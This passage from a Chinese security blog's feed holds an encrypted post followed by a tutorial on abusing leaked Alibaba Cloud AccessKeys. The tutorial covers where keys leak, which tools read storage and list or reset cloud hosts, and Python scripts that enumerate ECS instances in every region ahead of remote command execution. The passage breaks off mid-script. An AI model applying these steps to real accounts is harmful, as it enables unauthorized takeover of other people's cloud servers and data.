6cec34a01779ccc2d2f84abe519982b1925f4067b8e45ebfadb06695ebd5e74533a941c7a6cdc4435ad1a82bcc56cfa5ad0f6eb98d9f3a5ef523d39e7ab6f4bb0dc204a770bcb95a0a0930fa0ca1b160a757ca312a3b1e893367c3ac65371f048fb54debe484ca30f8542b7e934e14ea86048e1feee4f700b7879378fe2eb3bab3c1793bf070bc28e240cfba604294c2115e8324a9ebde738dd9a82a2c77595cec2da08a74f077bf93ba2c1333a011b3642da7edb0f37e38007f4ed347351599fad5e2e19993ae59ed10d6725f2d0525d9f1cfb74dca3bfdd205b1cd772515c68195965b958065b6bdb3b2c352ce671bb4daf2a3c918916fe5dc274b16e416f369e04f9d71aebbc387732d06604cb4c0564dfdc0aae9c29a8fa649b46f750e1794c5ded12ca5c22ec2cf80eccce6f5c091ccab1112b2c47b373c882f85acc05392b34a1d4c00c913c93dc2fc2a0f9fad97fa104048f7c9b58cc619228690ad3643c591ccc3e4f6351314f335b157b8a964b9aab3163d7032c351d1067d1ef1efa1d8a51b61e4e51ef8bf8b5c6408e6c96e240c490f730e2d4f0721b3115e6dc52cecbd635147ca8584dd61a48724942a5b89d723653f1ecda0f475e07ed74494f9c8a7baa425479df9ebf62342df0f0354e93da3bd8b108bbd8031aef436bd8632f1addfcd18c9e73817eed80b18a0070e727f814d5aa1a2eb27b086cb193378ee9172014597f8f15e66f7c22b89cb5c663ec5e5371d1acfa602543765c3ebd799e22dfa2c73fa2f9d093b5b78e5b1d6f7db63faa09df3aee18a0a2fd0943a1e61a84a280dd70d92ee34c7ea92d588d37e34fbe1fb041992b5e19595dd0603ca533f173331b80bb997dcc0ff05c7ac9810bffb72c2c61101503ce194240c92675764a9e3a5371fef7f59a08dc2805700ef48a7db2e8f7dba91fd0f80b131e6a7d96db42f8531f0c87c8dc7371a2122691086c89e096334c0311f6e31a2c889af8fedebfe0aa4c08f061732f90c92b2d2d763eff904e5517c3765b2f0b6b58cc96d5c23d9714bab5366f39f67127fc429b9e2fa310f2c882469ae43790249d3d75eb257c2a36aff93c2c6268fa29f1c8afa19533c22852b288173e16c649b9df93237746d1e1e9c980828ec703d607dc690fb0274f7b18b956bb41053597455e1a538f3369fdc0c7922cfed7c3e52c01f1f19d6abe674e0e538a7a17722fc9a4e425024210771e4f82af291e2c67f9c74eed7a16b03dfaadcf7fb587ea603682ae9ad725f792ead45160a48640f1ecee4f613de309aba6c7b9de0207334a8894fafe7bccddc3e29b6978a52b25651d7204c6d4a86d8b6055690badd47ba8a491be940adf85fb75b8256ff090e20dffc0a3be2acfd14e6874da0de67b9dd13ef778c991c5c6f242a27d39d389397265c72e3fbec97b72edafb79afff5503cd8c63226507932964a2cd6916046113746bf1b55cd147a444b4111f0a2a8369af130ee8aeac5f137ae8fe199de0b2020803eb40ac79e80ea624de8f73a2fcb096e0edbc0e952a5c147b08a3da5ff7223744abdda6788db696b4fb68c221db286ed246e81832012c040e7ce26e2ce913094c23ffaf91b67071d725fd58103542cdd36a34c74a3a241cff2f5d03833aa72444c80025a727d4332fad5eb423499ca61ef7acc268937ef647c3bbe668157941a699e4540efc331b7a45e766fe06793f94dcd1152e0fc9db1c9bcf75f54de42195f9490bf0746ba1465622d8c0d4c6321c13c4b44593245429bb06592bf699b0578a3080dfb537768698180ebb676cbb5f501bb6a71524b654a97987803b9c168586772b476946fdbcddb334660878834b988f21758dd4be7c8798b962245bf020f2237dc87345360af2b42234f8d615822fb495adc4362c04f2dc9927adf70063870438d3723cb0cca42614a4b83708714d0a3ecccdbf04469bdcb96a07f6675ae567e25280f99aebd134bbfd5f042a29a8d5cf40582252e78cefc34eae8773d2aa3d1069e9dabe690f1f84c8450ba5333175f2e4796d7e5ad2afa822f5e1d4c7860c91a887ff8c8e0c78244ec3089d651d5c17b855bc9e468f8f3e623c8163fae7f8079c6033c4c2fcfecf283ae4ff991401ac064bada212e098f98d3e91da6cb86844215eeea0e904aa8fc36d9f575dad7932ac217bcd6530883b65c7702f8e7368772e126c79aa0c34b15938b1fec416e8d2229b2603cabf389d2b427a866f42b16c0e4b9e527f9f17f0f24d612eca61b294b73fd806ba8683bbe39ded4f08d1f989c618f0b6b4d734cb949fb36ef0add0030e1250d51762d35409b2012a5a5b715a80ff860eb2b65e9baf864646345141c38457b31a1b0ed01f1158081e14c39546d19013500969edcb2037b26172285b54eaea810d2593a4dc4cdec5d2b6f0e28a652a1b69e2a049a14569247e60a417ebbf2db5e0586c1c4e6229e90ce4c0ce2ef65e6fdee9e770c474e7480a7f5810a8749bdc96a8f421274bad9a9bf80898e5db8a1e475b2d22cf7633500939ebf0d7f24344229c1045e4bd1380f25a8d503751298288033da833e8c818a2c03fc8ea797a5d788bcf6907df87b765c133e4da2ef3ee4c6cd1e0eebf448a9e02b3ffe680c34474e7d555cc07f84819d9e60300863472fb021317f195831fe32e24ca2358bca9029a0cc40fe7d6c4671a918c5812e494181c1ea8ff58ae5b1a246fe0c405eabc9a93c4c63bce73043c030f202b853430f5a3a8953a8e19c8d28f7b1581d7eeba989cb283c94656ffae9acd608f6332a291d4d08e51049948f6bf58c72d1ee64b8703130e4f8dc22e2af5cb20c4484b9d4ea6c7f905d8dd77f89cbba7212cf1702407406073cbc9aee5db34d64e28e88b8355b8330f0a9acac1c236cb79fcb56f899009ecdf6d9a73a8d392e320c05fdb1d1cfd5836d90749b5338a4a18d5769f9965e645d1123ad9b13b42268c856cd56a10c1f93842bcfb379358fa4149f6cddbdba5e38835c0087972c4c860c3bf87fac1c549768f5814b1cdbe0ec6c1687e0953bb93a41216147592c9ba26006ea262660fc63291609812267284cbf3adfa9d75e209fdcda1664b1ac57931925bd2419e8164a34c0f4c1166fc036225023818d8cfa887fe901a0002546bef23a5f6ab75a5914e00a4197b3b992f8ee0bb97be4deb780531a505260e1d0e8ad1484d19c1bf5c5887aedb4462d13a5ddd25331cb4ad7c945ca945a5bb07ece0db49072e9aac7517af8015295f084b94302b52bbf7ca8da8d6f311ec977d9362a20164e532be5da47a0e5ef41a4d42904d59594a662e1273173165a86a89dfc0ee479ae808470a1d8893cd6c0f096469ef104189266af1df6b5baf9f6bbe47e0747e2d2ec47ddb00097694a1d79500470c0c0ab4c8ba5591dc0144d0d43a88d4b4ed3d1ea5083cf484cb1e829d91ebe046a65001a61c6bba64503ca8f7a5ae4de3ae0de94779e13ddd3f0d57219efe7f030f0c87b47a2e5b608951df1a43116e35503e2b4aa2584d0ac7007a190c580989c67371c60031df7d8e2b11e920f1c756f4dbddb8b6534b486b33966c0d34ce2f8db47355d66a35f90177dda75e07b68390e7487353023e67656d2bd5801146870e94ae3f5fec039055643fd92889fa8bd8653209de19a773aa454521bee6999d3099ae26b4847be09d557755173e3e74ee953d3b50d6c06c72d228418fb1428e1bcac6df928455e31082bd40c36c9cb8398ecdc10c74318a7a0a855b616da116e170fcf8a72f173ed8e0dbf38418d157899c4a07d8abc7edfb49fce1d1447b577c366d06082cec005130b8a98b753f914e71b508aec5723c39134b667f08dd9406b65b31b79abedb60e83c9689d22153789b36cfb170419edc1d6b08a12068ecd29d71bf7bdbe829512493edd2f46dc6f56bb84b700c60c6ef22b4f46651330580e7ce3838c26d7aea525347501aa847323ceea43461e6b165b3f55a39a4b9089a730b206e1544636af5c6045c806bfe48a61bc9f2fd35427248add08a6367645351183085deac1fdc4c3385478dd507e82187eb1376b0282375499f6c537ec5b8f5ca7cb9b67cb09a825f4d809142839362e317c9b2b38973495e4db1bd02a3e5365cd863e337b062d8780df7798b31977846f62952a580391da67ed45892b0f663d390fff22b258b2e5cc115c0cfb76902049e363fce025c0316abdfdc4b8323aa6305f9356ab7b35fefd34674fdca90b9fcb4e5ad4b1fd0ce5583318e5f6fd43b147709c1bbcff3ca42124319c022550828d34980f8fc7826a95fdee1da0cb4eb5e08f5ba8280314c72b0392de58e114fd35452642ca8700816d2877cee5f6624dbf84affeb35473d01d10521f36a1d127d8cfb27eed14625b7fe2bc4b35392509defb8137a98080a0e63794a206e39d3dbcddb7fbd2292b98d85208dc92768db56c32521fffd324ecb4a143c425508cb821ac77d96cd9624e458878c8adac21158e6ce8511c31c402555cf8ba65adb2f7b073479dc3053777c0782f6081e00385d73a63ae5d5d8825fb20b4102ad9bbeead02a21df547b40eac830ea29baf2caf313b1a5f48279b14ff98cbbda07fa506b8b7ae939c70505dddb053021bf58b19e423d74b2dc70881567661eb788c3b088ed8fb5de643d7ff5770b0faea04ebef58f714f0dfeed5547a5aa07d5f8f492655e511d5e8474b4a8c2e235a3e4869800b288fd71637f1f3316a3f016c6a14f7d451f44421f086a5c3c6ffe26da78b2b0cc3228c2287f78627a68ad366e76077c987bbe6106a1e7020e4e8ccf82466bfbe52bf736a57bf195b525d04ccf884c692d5caa0202ca40bad2b412431766ce004f1b982e360c4b1f7f039db1f43671b7a0fbf0294587b9e3144efd8af607cfdb9479dc287130292c1ba381a9217b80315f126917013a43034847d80353381fb7c9facb60173033ab46b3aaf587dafadda4b5196b9121a8cc055ea376fb211a90e8cdd2d97ce5530d93b5b1c27459d17e53955c193592e3af76f7ba2c537c54d15ad8d51c02d3c730e081469bc834964d0636bd7a2f62b59023384ad858332a7747da69ce5d2f69bcdc6f431a6af2e713021f00f4fbd2aa399367b5004af46a33c8037aaed4855d63f8a50f628f12d9e0be5a2e283a38d57983ec5b38c519e19203a5d129cf4b9a455c106969453437c50b8d1ff2d270ee18c6ec2ece41d133ec123da00bcc2d0c9c2b4ff5416a507e53a9fba68ededadb37aa20e5b54a50496b9d4d5e00530d073b14d415fb90ab98de6d1cebd01e96177ab0cb1b53a3e3c41ef0db79ab413231f6e5fb2f7fda54539be87048af45676d4a122632fedc17e40b968c9fb28ccd36a06e9a164d7c09161da848007629f907d2ae6f6e895695f8d8de226b995e7d9d721c1987f51e3aa98ec863776c931cafaae2c948638be208696bca8f4a827ea1cb15ab86bd9024d793905dabc701a393d558f55bcf2559926a38de46eb856876104ee6eda84f77dc9690836bd8d817fcf0e605734cc3c1b22b58c2a1ac63b4ab19073fdfafbf375e5f19eaa452e9ea1299c733f1908b7832d5b38f3c1c6abf99273a93bc791189e943f2b4260ec004ced16ffc18496616744402a3736193dba34e79c7c45b11156c9b2c9c292a3d36d25be92d4daf73c850027920a98576b71f020a6d7cba606b56d7325a9686997477834d72f29c99c823d905b723923280f073f81639461ea41a2035c025f306feafb9d8370cc1704c7cb679058d90b4ac35637bd26816f21df5a6d53b54006617246b41c69182f34ee46d7a6b0c36edf9a6eb14e155f6a1546bb611922f5057c10a8ea3c4557faee3b15b42479b79348db618dfa9c6ac84c72564a5bad31fd0ba9a3811e4b5b8905d5427632c548c69be14eac799818a1edef4540c504b051c938e612ebe264520c95fc8961c6c8aee902db060add25eecb50765acc7c32fb92354e2ab6300b79d16ef8b36ea12cca9db384383fc5cb4de10a64d0017d85175a0dbaa462a46b8559b9ab643c265ebdd1908aae3df8b814e6297d8273dbe2b23f003c36e787e943a1dbf6ac292b9decf25924b11d944e4c4d841f29644d1ad3d75fb5d6bff6817e3e5c8eface739877601103983c8b6f93c82497257d27a7b7b2a9096547c8392ba02d06556e5561135d249ed39a4ba8888c9df3860e67d9a668c28d6eef563eaa5f7d455d9a5d46f0f1f5a6820cf6132d6def7b41eda378f5dcde2e001658e82ebb1b98faa60ac60cd818f2e71c85520236fcf9ae8fae749cce426583be9d36b3a374eabb6f75400c1526f533386caf187fe97a658b31f540064f0dace7154c769ae58c53de3ecdab2a02edb291aa8dc9f85830fbc80da0bde8495fc1399a9c16d889210e5de532dcc14b06f8993a53cb84751fa5d34e299905c6aa5249d981af491192e63e5031f903db15fc92bd9927168b6f44a40d08eab344f1a9e2c0c00f4e7dcc00145e73f5d872b474596d9315133e5cbc9a4c353724f9302506d9a845eb3ff00ba0017add1737ebf44777ba85d912bd9437a16fd5d9feeb6e95991027f49f18f723ae21787e24ec02a0596227f421f7f0dcad7a8c7b60b48f5e7ac8f516a753054f9c9ef852e5adf9428b9899f6e6f5b9f4893356c50d942f3ab9b79d7abbbd8d831230c40cc7885727325322ed6b3df548ef2115cae7a7b732d0086fe3636e7f3495ea94e1f25dad3de933784c65c71249ee818c700b815dc6e32e1d972d1a70f143514f969eb0085c0c0602091826955be550f0de2856011572138a548e1105a4a1562c04f8fbc5c7db5a3afe77bbd0c234a7d3ee612c249e984a7ef09b2f6dcb472c56934339167a641caf37590632fd7d60f16e564a7090fcf46a02126c697b77bb7be5e71733cad079cb1b74ce025d85c98ce178fa081e95a1bcb0ef02bd07a66922133cacb2df19d265300b4a0e393e8ace3ae3c470c534d9d6252d2da18da3b995cf5f0696a2af12688d646eac20ab8d662819428b615e3b0c98e6899269b36efac11d30a1d79955e5483992032786178996692577334e1182f44907b61a48a3932cbbc4d0f7df979c2c04e688f755029cc14c79f7b609c8d8de6c37f4473f1ef465a77c54a939eb16dfc8209f5a93dd167fb25ea21a31fafba66ebdda30d079d735061d651b4a45a0a6c26fe889efa05bbb2d9355ac2b3747b3cc0fb85363e4ce9e0c28bf6ec6fd672d1f9b4351d60e5c57884c93e3560037b3c7b456b5014eb3bf65ad250366aee6e725196c9d656007ca6bfe4e34dc4b070726dc4605f1afb8fb116621a7582104e043145378f5269b0b0bd2b73551b6355b70d06022fe8691156ef079f2d304c70133a34e0427579ec7e0df2ec785b9d4cb4dc7c7ea7ab1aa6568154ff466bd650fcf4ab207754953e74535f87368b70d8a052cd0e17eda070d17b24747b2b3f88dffa1f73c63b950f581e66a954ff840353dd1ffe6bbd28e9551b64490448a87e763d97f17d1922d77fa32cd9253481fff5e1c33bbfc4e1fdf8ad47b924ff7b2d714dc96952b3727d371724dda8b39ba6bdab14e6aad12ddf73b343c987b914725f6500557a95b85b4e3e68640266ff36a3f347fb712c0c058d9949ca359959659bd149d8515844719b3d7711013fb85d805542da6fcd0e63ddec44e8526e9e81733d1d9d0471e6928993228f7e8da0097815190858ccb5a09346284a67cb17c6952167649d6d7477d543e378514874e9b439ff5bdf4d67554700d25ac1d0d8a060c77468901b1d09d8d39251775c5835df3387c74ebe44019a63b5b2b7de0501775709c2e9be09150b67866470b8b57ff2e2760cedb50c2c9ed632b430d5ce13fa565e55be389cd2cc6483c31a65cf8e6e159b60e8e87bab1280978e2d92cd89c077942add6402efc35f8c4d477dabfe530e62a83659a8f0666bf05d7b6b10ab8e8decebb96cca77d99f45603c1f9c3ec7cc8101fb32c4a91cdfc781c6779c98767dd00ff41c0b22fcd5b0373954b4f1b8743608a836c61e42d14624a4692396f18064a09f4632720419f252372fd7e63583067272ac8c6d8a04c7451bd64699325f6306f655eec63b7c2408d2d6bb3ede77902b5a329f26bc867484e23b31e975b9efaf13b93f007a0b255a90661e3a4c00b180f20dd89de777693330002986f51fa9daddde6c4d46e62e339f23b3197156e4c9b2a9cd6319f907032e15d11c960531a4bf074adc6853b2473245005a3aa6fd0f7fddd858397c600ca64edd0c99575867f968328d2809ebecde2e827ef0809334ff62b27a279c436dd2dfda3b210f8058ff6c9e86217428bb612ab8d5978825a0058c5bebbf33abc1a20630525c48de31c67d9905101c598858604310f603081acf4cbd3526e475f3895f0b56f98073bc5795d6c1840558dbfdf3552d119165942d8b3d6230896b1ef538321447ea2f9bb6ae9d073aa51f158f10b433872692a6593fb12e1fbdbef38751c67dac6920e0f7260303d46d61a67bb956dadfb5fc0cf7a39e3977d3284d1ae58ecdd8b6185fe591fc8877447513ab41031c91a60c577ba9e98483eb80278614a275b944e651db451385927a1f64303ea1f4bdf0890b4cacc4fc80b5dcc16a09427beafb6daa3a5ee5d4ef77192a19f504c7043cfc4e169488bffafd3cce42fa1ef4ceaa82c4f3276d8c013c6c8dee257f86c9d4e418b050589ae995133fdf4700f281c16b04d3b157ce28ef13b2d4c17fc24c413cc0e0b0e05183faa63b68141e88a0fe2b2be0fd04075426c9cf3ad51cff10f7257f6abea8dc86b353bd2f4169e087711f20647cbf879f318fd3a8173e663eb1b11b52c8ace4587db0d284e9ca57b8a23c510556bf89805ce2792af6918bd164099a518c067c8e183ec25564c518e75ff5a77bf89bfb3821611ef46c270ee6f11f31562f6f856f1ba3da0fa161911b979ec0ef457ddba2e43cc998b05c1bc67a660071b5b45426bbc7fb8372435fcdc8488a53795e54c3dde532bfd63e8a3e1f6b792cdcaeb34fe83a07c62059dacd952428e13154d9c70740d722bf146817ba3f70482f2116649fca04b1d2ba9347384e02ddd23d7237f0c6ba6f351a9d7e134c3536fbd690d7ac25b22385608c71ec9b11a6c543abfff6f87e0bceb21fce241708a48839cf0d9d3c9a826cccfb015541a3e5327e54ae2ce43083a9d525fdfd4f0c5eeece4dfc40498543c01a2454c7f46e925d73822a3d6fc3afb027ad3bf8cac001810164545b08b3dba8de9ce814473820b6332859079d5c4e684e0e7193ac6444bd4961297f9458858805873f869071a086291f187314380d87679b7abcf55530f6189e066d72bdf72d56e08f033ba85c70f432d133d9b02a5510719a9b561f2bee070f0e0fa937af292e5d2593564b94cdf9abee2db7482b63a23b3b742131c89962348401fb01807b6eedd91f2b0e0501f36bbaf2b122e86f3b991f36e42c798e6d09bd6e3a1ce836c766875925e48896ad01f54c428d9108250c183048eb1ba1103d1593c003e67220e4f25b20f13efa781e9a2707f86fb4130409ab401ac205e7a5bd5d91b657b98036458893da595b4c82e4e72b7a5df6d9051774f779b59bd3d413a58019cea38e7d44e03e5b656b400a0d0bc3ee1fddb2ff2e76b6eec08507113a014818786d568ca224944d451d3c89acc0890f52d2922438ae95aa6b0519c796b0abbb11be06e67f9ada332558066304d0eccfb4e21b2aeaaab6751f64d76abe222d01729fb29f59ee3847db02e9c0fbbaf087856d70c67d7055038f367e43e5c8d344de05d061b0508905f4c9a8614b5819dd59df74bd04c407188f87066560e9281748644a66d8927100571c73adae241606edc599089f2b52c8b9343a6b88d816bc0154a24b6b331a04a4e7e9a0a86bf9db90945df5d49078b3d6792c0d5aa05ec9346e67da3528de9e88769afbd472dabbfd7445d1e47a19c793813d85e8f9b92151e228958f5145b560ccd04e549ffb3b8148153210cc4602f13a0e7afc9c6f104ba0a6ef688c5edcbfb207b88de8244f96fdad9604c42fe6863857426c89e0beec5ed09c1b7a45896b3d6edcdd1b3097ee3c7983f8dc8224d58bae40e5ffc7e538d81dfd05c3bbd3427f9b238607364389bdac432c185c623425f64aaf1b2ba82f4896ba4470e3113548a5feb1392661df89491c348a5789ff4481d7fb4bdda3d997dee22004bdb3a647b8da5f6d325cd9ccbc1d62bdeacca8daa046f77b734f3cbfaddfede80da817342ad9a8ff204e40107d837a2329af930dd364700a1c6b00493d93352a301b1c705c36ed6998c7f114feeeb009126eaed7308973b0da5f6f66124a53c474dd545db51a5a8f9a74654d9393d09dfa3dfe28c3a6e2d41ed4e370f362d990a5782f2865eaaa7e2a4d0cef04f05acf7f9ef7315abd482283dbbb7b271f2b2cc25226f6362e90bccd1ce2e019bc6eb0a4f7eb1b0c4f7dcd9d4fb48555598abdf744872b22a14ec734dcb55ffbe01790ae203f73dea62c0d8fb28d77d6cf2edb517accba899932d1fcdfa39b31b9d4f8a87e219fe20d305c530dc58765c58ed77063cabe2149fe823e2e0473afe4ccaa317c985c472e875487d6c8cfb34ad816aed62ca3af4c22e024d33938d362bd10f11dcc7049ef8927226f5a6c03d746790a1eba86fef513a977cc744d895b1952507d732af0aee4c1b28a5bf325e94b703c4207aa83d90410c0391b0cb23d9d876f0466c932264d7aef176c7a2cf8df5adcccd1d2b2b726ae32f92e73a33dd784d21e95ca17ca26a91bc41777fe5af4e3fc79a62d75ccc637bb0e44e8eaa1a5020f824860ef6bd3e66cf4df8a6b8a295e8447705e24bdf1e4cbebe7378425c6c66c5099ad6d0ad41287ed8d5da1f88afbe238f808d9737010b097982c20db53f2539985537c73ae4f83766a28a719147d39411234cca50c6079a73f4b118fd3aa4d51be5a5f593c99c64d8b4aa2493984f28b835c14a57d857224d98127e1957ba03de1284502556d04fe16cd4567cc333c98dad242b7bc7d3be5dc3bb80fd7239178c422f5c31785581acc5b56b56af19c04c559d04610b628830f53f96d02923bef1fa726dd4e3e080be4197ef0b2948ee04ae6df27174a862f72886eb5609ebab5bd57e81e53b01fd665281e905c476825f36a45957b6e9239aadeb7aa8a7fb4e575c347b33b846a40dc6bb1c12f7da953a857970af77caa1cf14133ab384b0158edbde26fdbcdeca0dcf3f61829f1186bf79537b41714ba65896072170e5dcf7852300bf835c2b851a79bdce95521149045a4670b2ce2c290</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      密码
    
    </summary>
    
    
    
      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>阿里云AccessKey泄露的利用</title>
    <link href="http://yoursite.com/2020/09/01/%E9%98%BF%E9%87%8C%E4%BA%91AccessKey%E6%B3%84%E9%9C%B2%E7%9A%84%E5%88%A9%E7%94%A8/"/>
    <id>http://yoursite.com/2020/09/01/%E9%98%BF%E9%87%8C%E4%BA%91AccessKey%E6%B3%84%E9%9C%B2%E7%9A%84%E5%88%A9%E7%94%A8/</id>
    <published>2020-08-31T16:00:00.000Z</published>
    <updated>2020-09-02T04:08:05.151Z</updated>
    
    <content type="html"><![CDATA[<p>在渗透测试非法网站中，很多站都是在阿里云，亚马逊云搭建的站点。而阿里云AccessKey的泄露根用户权限大可以直接接管ECS，AWS则是有限制的，不是根用户是通过IAM来创建的用户，访问S3，EC2是分了权限控制的。在渗透测试中获取AccessKey的思路：github泄露，apk反编译泄露key，比较低权限的webshell，js文件，fofa查找。</p><h4 id="工具利用"><a href="#工具利用" class="headerlink" title="工具利用"></a><strong>工具利用</strong></h4><p>利用<a href="https://github.com/aliyun/oss-browser/blob/master/all-releases.md?spm=a2c63.p38356.879954.6.745223c9XFlufA&file=all-releases.md" target="_blank" rel="noopener">OSS Browser</a> 获取oss上面的数据</p><div align="left"><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/6/1.png" loading="lazy"></div><p>利用<a href="https://yun.cloudbility.com/" target="_blank" rel="noopener">行云管家</a>获取云主机列表，行云管家可以重置ECS的密码（千万别这样做）</p><div align="left"><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/6/2.png" loading="lazy"></div><h4 id="OpenAPI-Explorer"><a href="#OpenAPI-Explorer" class="headerlink" title="OpenAPI Explorer"></a><strong>OpenAPI Explorer</strong></h4><p>python导入模块(python2的环境)</p><pre><code>pip install oss2pip install aliyun-python-sdk-ecs </code></pre><ol><li>利用DescribeInstances获取某个区域的云主机列表（DescribeInstances.py）</li></ol><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/6/3.png" alt="" loading="lazy"></p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>client <span class="token keyword">import</span> AcsClient<span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>acs_exception<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> ClientException<span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>acs_exception<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> ServerException<span class="token keyword">from</span> aliyunsdkecs<span class="token punctuation">.</span>request<span class="token punctuation">.</span>v20140526<span class="token punctuation">.</span>DescribeInstancesRequest <span class="token keyword">import</span> DescribeInstancesRequestclient <span class="token operator">=</span> AcsClient<span class="token punctuation">(</span><span class="token string">'&lt;accessKeyId>'</span><span class="token punctuation">,</span> <span class="token string">'&lt;accessSecret>'</span><span class="token punctuation">,</span> <span class="token string">'cn-shanghai'</span><span class="token punctuation">)</span>request <span class="token operator">=</span> DescribeInstancesRequest<span class="token punctuation">(</span><span class="token punctuation">)</span>request<span class="token punctuation">.</span>set_accept_format<span class="token punctuation">(</span><span class="token string">'json'</span><span class="token punctuation">)</span>response <span class="token operator">=</span> client<span class="token punctuation">.</span>do_action_with_exception<span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>str<span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>脚本会输出该区域的公网内网IP，主机名称，InstanceId等等。批量获取所以区域的主机信息(主机名称，操作系统，内网IP，公网IP，区域，InstanceId)，InstanceId在后面的命令执行需要。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">import</span> json<span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>client <span class="token keyword">import</span> AcsClient<span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>acs_exception<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> ClientException<span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>acs_exception<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> ServerException<span class="token keyword">from</span> aliyunsdkecs<span class="token punctuation">.</span>request<span class="token punctuation">.</span>v20140526<span class="token punctuation">.</span>DescribeInstancesRequest <span class="token keyword">import</span> DescribeInstancesRequestRegionIdes <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">'华东1（杭州）'</span><span class="token punctuation">:</span><span class="token string">'cn-hangzhou'</span><span class="token punctuation">,</span>    <span class="token string">'华东2（上海）'</span><span class="token punctuation">:</span><span class="token string">'cn-shanghai'</span><span class="token punctuation">,</span>    <span class="token string">'华东 2 金融云'</span><span class="token punctuation">:</span><span class="token string">'cn-shanghai-finance-1'</span><span class="token punctuation">,</span>    <span class="token string">'华北1（青岛）'</span><span class="token punctuation">:</span><span class="token string">'cn-qingdao'</span><span class="token punctuation">,</span>    <span class="token string">'华北2（北京）'</span><span class="token punctuation">:</span><span class="token string">'cn-beijing'</span><span class="token punctuation">,</span>    <span class="token string">'华北3（张家口）'</span><span class="token punctuation">:</span><span class="token string">'cn-zhangjiakou'</span><span class="token punctuation">,</span>    <span class="token string">'华北5（呼和浩特）'</span><span class="token punctuation">:</span><span class="token string">'cn-huhehaote'</span><span class="token punctuation">,</span>    <span class="token string">'华北6（乌兰察布 ）'</span><span class="token punctuation">:</span><span class="token string">'cn-wulanchabu'</span><span class="token punctuation">,</span>    <span class="token string">'华北 2 阿里政务云1'</span><span class="token punctuation">:</span><span class="token string">'cn-north-2-gov-1'</span><span class="token punctuation">,</span>    <span class="token string">'华南1（深圳）'</span><span class="token punctuation">:</span><span class="token string">'cn-shenzhen'</span><span class="token punctuation">,</span>    <span class="token string">'华南 1 金融云'</span><span class="token punctuation">:</span><span class="token string">'cn-shenzhen-finance-1'</span><span class="token punctuation">,</span>    <span class="token string">'华南2（河源）'</span><span class="token punctuation">:</span><span class="token string">'cn-heyuan'</span><span class="token punctuation">,</span>    <span class="token string">'西南1（成都）'</span><span class="token punctuation">:</span><span class="token string">'cn-chengdu'</span><span class="token punctuation">,</span>    <span class="token string">'中国（香港）'</span><span class="token punctuation">:</span><span class="token string">'cn-hongkong'</span><span class="token punctuation">,</span>    <span class="token string">'新加坡'</span><span class="token punctuation">:</span><span class="token string">'ap-southeast-1'</span><span class="token punctuation">,</span>    <span class="token string">'澳大利亚（悉尼）'</span><span class="token punctuation">:</span><span class="token string">'ap-southeast-2'</span><span class="token punctuation">,</span>    <span class="token string">'马来西亚（吉隆坡）'</span><span class="token punctuation">:</span><span class="token string">'ap-southeast-3'</span><span class="token punctuation">,</span>    <span class="token string">'印度尼西亚（雅加达）'</span><span class="token punctuation">:</span><span class="token string">'ap-southeast-5'</span><span class="token punctuation">,</span>    <span class="token string">'日本（东京）'</span><span class="token punctuation">:</span><span class="token string">'ap-northeast-1'</span><span class="token punctuation">,</span>    <span class="token string">'印度（孟买）'</span><span class="token punctuation">:</span><span class="token string">'ap-south-1'</span><span class="token punctuation">,</span>    <span class="token string">'德国（法兰克福）'</span><span class="token punctuation">:</span><span class="token string">'eu-central-1'</span><span class="token punctuation">,</span>    <span class="token string">'英国（伦敦）'</span><span class="token punctuation">:</span><span class="token string">'eu-west-1'</span><span class="token punctuation">,</span>    <span class="token string">'美国（硅谷）'</span><span class="token punctuation">:</span><span class="token string">'us-west-1'</span><span class="token punctuation">,</span>    <span class="token string">'美国（弗吉尼亚）'</span><span class="token punctuation">:</span><span class="token string">'us-east-1'</span><span class="token punctuation">,</span>    <span class="token string">'阿联酋（迪拜）'</span><span class="token punctuation">:</span><span class="token string">'me-east-1'</span><span class="token punctuation">}</span><span class="token keyword">for</span> RegionId <span class="token keyword">in</span> RegionIdes<span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># 填入AccessKey ID 和 AccessKey Secret </span>    client <span class="token operator">=</span> AcsClient<span class="token punctuation">(</span><span class="token string">'LTxxxxx'</span><span class="token punctuation">,</span> <span class="token string">'Xxxxxxxxxx'</span><span class="token punctuation">,</span> RegionIdes<span class="token punctuation">[</span>RegionId<span class="token punctuation">]</span><span class="token punctuation">)</span>    request <span class="token operator">=</span> DescribeInstancesRequest<span class="token punctuation">(</span><span class="token punctuation">)</span>    request<span class="token punctuation">.</span>set_accept_format<span class="token punctuation">(</span><span class="token string">'json'</span><span class="token punctuation">)</span>    response <span class="token operator">=</span> client<span class="token punctuation">.</span>do_action_with_exception<span class="token punctuation">(</span>request<span class="token punctuation">)</span>    response <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>response<span class="token punctuation">)</span>    <span class="token keyword">if</span> response<span class="token punctuation">[</span><span class="token string">'Instances'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'Instance'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token 